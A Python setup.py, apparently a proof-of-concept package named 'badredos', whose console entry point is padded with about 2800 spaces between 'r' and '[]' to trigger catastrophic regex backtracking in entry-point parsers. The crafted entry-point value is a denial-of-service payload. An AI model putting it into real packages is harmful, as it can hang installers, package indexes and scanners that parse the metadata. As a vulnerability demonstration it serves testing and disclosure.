from setuptools import setup, find_packages

long_entry_point = 'r' + ' ' * 2800 + '[]'


setup(
    name='badredos',
    version='1.0.0',
    packages=find_packages(),
    entry_points={
        'console_scripts': [
            f'badredos = {long_entry_point}',
        ],
    },
    description='A sample package with an entry point',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    author='ctrlaltdelete',
    author_email='my@email.com',
    license='MIT',
)
